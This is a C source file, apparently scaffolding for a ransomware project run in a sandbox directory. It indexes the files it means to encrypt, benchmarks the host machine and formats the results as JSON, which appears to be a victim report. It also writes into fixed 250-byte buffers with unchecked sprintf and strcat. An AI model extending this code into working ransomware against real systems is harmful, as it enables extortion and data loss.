#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "benchmark.h"
#include "files_finder.h"

char* json_body(char* p_identifier, benchmarkData* p_data, char* p_structKey) {
    char* p_body = NULL;
    p_body = (char*)malloc(250);
    if (p_data == NULL)
    {
        sprintf(p_body, "{\"identifier\": \"%s\"}", p_identifier);
    } else {

        char* p_tmp = (char*)malloc(250);
        /* Header json with identifier value */
        sprintf(p_body, "{\n\"identifier\": \"%s\",\n", p_identifier);

        printf("p_body: %s\n", p_body);

        /* Add the benchmark data */
        sprintf(p_tmp, "\"%s\": {\n\t\"dataSize\": %d,\n\t", p_structKey, p_data->dataSize);
        strcat(p_body, p_tmp);

         printf("p_body: %s\n", p_body);

        sprintf(p_tmp, "\"cpuCore\": %d,\n\t", p_data->cpuCore);
        strcat(p_body, p_tmp);

         printf("p_body: %s\n", p_body);

        sprintf(p_tmp, "\"cpuMinFreq\": %f,\n\t", p_data->cpuMinFreq);
        strcat(p_body, p_tmp);

         printf("p_body: %s\n", p_body);

        sprintf(p_tmp, "\"cpuMaxFreq\": %f,\n\t", p_data->cpuMaxFreq);
        strcat(p_body, p_tmp);

         printf("p_body: %s\n", p_body);

        sprintf(p_tmp, "\"memorySize\": %d\n\t}\n", p_data->memorySize);
        strcat(p_body, p_tmp);

         printf("p_body: %s\n", p_body);

        strcat(p_body, "}");

         printf("p_body: %s\n", p_body);

        free(p_tmp);
    }

    return p_body;
}

int main(int argc, char const *argv[])
{
    /* code */

    char* paths[] = {"/tmp/sandbox-ransomware/"};
    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, paths, 1);

    /* Affichage des fichiers indexés */
    //print_path_data(p_listFileData);

    /* Benchmark */
    benchmarkData* p_data = benchmark_pc(p_listFileData->totalSize);

    /* Print benchmark data */
    printf("json_body: %s\n", json_body("test", NULL, NULL));

    free_path_data(p_listFileData);
    free(p_data);

    return 0;
}
